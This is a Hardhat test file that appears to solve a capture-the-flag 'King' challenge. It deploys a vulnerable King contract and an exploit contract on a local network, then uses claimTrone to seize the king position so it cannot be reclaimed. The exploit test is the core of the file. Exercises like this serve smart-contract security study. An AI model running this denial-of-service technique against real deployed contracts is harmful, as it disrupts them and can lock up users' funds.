/* eslint-disable */
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { Contract, ContractFactory } from "ethers";
import hre from "hardhat";

let ethers = hre.ethers;

describe.only("Exploit", function () {
  let owner: SignerWithAddress,
    addr1: SignerWithAddress,
    addr2: SignerWithAddress,
    addr3: SignerWithAddress,
    other: SignerWithAddress[];

  let King: ContractFactory;
  let kingContract: Contract;

  let KingExploit: ContractFactory;
  let kingExploitContract: Contract;

  before(async function () {
    [owner, addr1, addr2, addr3, ...other] = await ethers.getSigners();
    King = await ethers.getContractFactory("King");
    kingContract = await King.deploy();
    await kingContract.deployed();

    KingExploit = await ethers.getContractFactory("KingExploit");
    kingExploitContract = await KingExploit.deploy();
    await kingExploitContract.deployed();
  });

  it("Take trone normally", async function () {
    // Create a transaction object
    let tx = {
      to: kingContract.address,
      // Convert currency unit from ether to wei
      value: ethers.utils.parseEther("1"),
    };

    // Send a transaction
    await addr1.sendTransaction(tx)

    console.log(addr1.address, await kingContract._king());
  });

  it("Exploit", async function () {
    // Addr2 exploits
    let FUNC = "claimTrone"; 
    let VALUES = [kingContract.address]
    const data = kingExploitContract.interface.encodeFunctionData(
      FUNC,
      VALUES
    );
    let tx = {
      to: kingContract.address,
      value: ethers.utils.parseEther("2"), 
      data: data
    };
    await addr3.sendTransaction(tx)


    await kingExploitContract.connect(addr2).claimTrone(kingContract.address, {
      value: ethers.utils.parseEther("3"),
    });

    console.log(kingExploitContract.address, await kingContract._king());
  });

  it("Back to normal", async function () {
    // Create a transaction object
    let tx = {
      to: kingContract.address,
      // Convert currency unit from ether to wei
      value: ethers.utils.parseEther("3"), 
    };

    // Send a transaction
    await addr3.sendTransaction(tx)

    console.log(addr3.address, await kingContract._king());
  });

  it("Exploit balance", async function () {
    console.log(await ethers.provider.getBalance(kingExploitContract.address));
  });
});
